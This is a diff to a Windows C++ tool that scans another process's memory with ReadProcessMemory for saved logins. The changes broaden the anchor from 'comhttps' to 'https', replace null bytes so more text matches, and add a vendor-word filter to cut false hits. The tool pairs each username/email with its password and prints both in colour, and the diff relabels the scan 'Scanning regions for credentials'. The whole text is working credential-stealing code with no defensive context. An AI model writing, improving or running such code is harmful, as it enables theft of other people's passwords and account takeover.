@@ -21,23 +21,35 @@ void SetColor(WORD color) {
 bool IsValid(const std::string& str) {
     if (str.length() < 3 || str.length() > 64) return false;
     
+    if (str.find("://") != std::string::npos || str.find("\\/") != std::string::npos) return false;
+
     for (char c : str) {
         if ((unsigned char)c < 32 || (unsigned char)c > 126) return false;
     }
     
-    if (str.find("favicon") != std::string::npos || 
-        str.find("lifecycle") != std::string::npos ||
-        str.find("http") != std::string::npos ||
-        str[0] == '"' || str[0] == '{' || str[0] == '[') {
+    const std::vector<std::string> noise = {
+        "favicon", "lifecycle", "http", "bing", "msn", "microsoft", 
+        "adobe", "protocol", "Signals", "scheme", "URIDetect", "Signin",
+        "yandex", "clarity", "substrate", "office", "azu", "onenote",
+        "template", "fallback", "network", "bitdefender"
+    };
+
+    for (const auto& word : noise) {
+        if (str.find(word) != std::string::npos) return false;
+    }
+
+    if (str[0] == '"' || str[0] == '{' || str[0] == '[' || str[0] == '(' || str[0] == '%' || str[0] == '.') {
         return false;
     }
     
     return true;
 }
 
+
+
 void ScanMemoryRegions(HANDLE hProcess) {
     SetColor(14); std::wcout << L"[*] "; SetColor(7);
-    std::wcout << L"Scanning regions for 'comhttps' anchor..." << std::endl;
+    std::wcout << L"Scanning regions for credentials..." << std::endl;
 
     unsigned char* address = nullptr;
     MEMORY_BASIC_INFORMATION memInfo;
@@ -49,41 +61,39 @@ void ScanMemoryRegions(HANDLE hProcess) {
             SIZE_T bytesRead;
 
             if (ReadProcessMemory(hProcess, memInfo.BaseAddress, buffer.data(), memInfo.RegionSize, &bytesRead)) {
-                std::string chunk(buffer.data(), bytesRead);
+                std::string chunk;
+                chunk.reserve(bytesRead);
+                for (SIZE_T i = 0; i < bytesRead; ++i) {
+                    chunk += (buffer[i] == '\0') ? ' ' : buffer[i];
+                }
 
                 size_t pos = 0;
-                while ((pos = chunk.find("comhttps", pos)) != std::string::npos) {
-                    size_t firstSpace = chunk.find_first_of(" \t\r\n\0", pos + 8);
+                while ((pos = chunk.find("https", pos)) != std::string::npos) {
+                    size_t userStart = chunk.find_first_not_of(" \t\r\n", pos + 5);
+                    size_t userEnd = chunk.find_first_of(" \t\r\n", userStart);
                     
-                    if (firstSpace != std::string::npos) {
-                        size_t userStart = chunk.find_first_not_of(" \t\r\n\0", firstSpace);
-                        size_t userEnd = chunk.find_first_of(" \t\r\n\0", userStart);
-                        
-                        if (userStart != std::string::npos && userEnd != std::string::npos) {
-                            size_t passStart = chunk.find_first_not_of(" \t\r\n\0", userEnd);
-                            size_t passEnd = chunk.find_first_of(" \t\r\n\0", passStart);
+                    if (userStart != std::string::npos && userEnd != std::string::npos) {
+                        size_t passStart = chunk.find_first_not_of(" \t\r\n", userEnd);
+                        size_t passEnd = chunk.find_first_of(" \t\r\n", passStart);
 
-                            if (passStart != std::string::npos && passEnd != std::string::npos) {
-                                std::string user = chunk.substr(userStart, userEnd - userStart);
-                                std::string pass = chunk.substr(passStart, passEnd - passStart);
+                        if (passStart != std::string::npos && passEnd != std::string::npos) {
+                            std::string user = chunk.substr(userStart, userEnd - userStart);
+                            std::string pass = chunk.substr(passStart, passEnd - passStart);
 
-                                if (IsValid(user) && IsValid(pass)) {
-                                    std::string entry = user + "|" + pass;
-                                    if (seen.find(entry) == seen.end()) {
-                                        seen.insert(entry);
-
-                                        std::cout << "------------------------------------------" << std::endl;
-                                        std::cout << "Username/eMail: "; SetColor(12); // RED
-                                        std::cout << user << std::endl; SetColor(7);
-                                        
-                                        std::cout << "Password:       "; SetColor(12); // RED
-                                        std::cout << pass << std::endl; SetColor(7);
-                                    }
+                            if (IsValid(user) && IsValid(pass)) {
+                                std::string entry = user + "|" + pass;
+                                if (seen.find(entry) == seen.end()) {
+                                    seen.insert(entry);
+                                    std::cout << "------------------------------------------" << std::endl;
+                                    std::cout << "Username/eMail: "; SetColor(12);
+                                    std::cout << user << std::endl; SetColor(7);
+                                    std::cout << "Password:       "; SetColor(12);
+                                    std::cout << pass << std::endl; SetColor(7);
                                 }
                             }
                         }
                     }
-                    pos += 8;
+                    pos += 5;
                 }
             }
         }
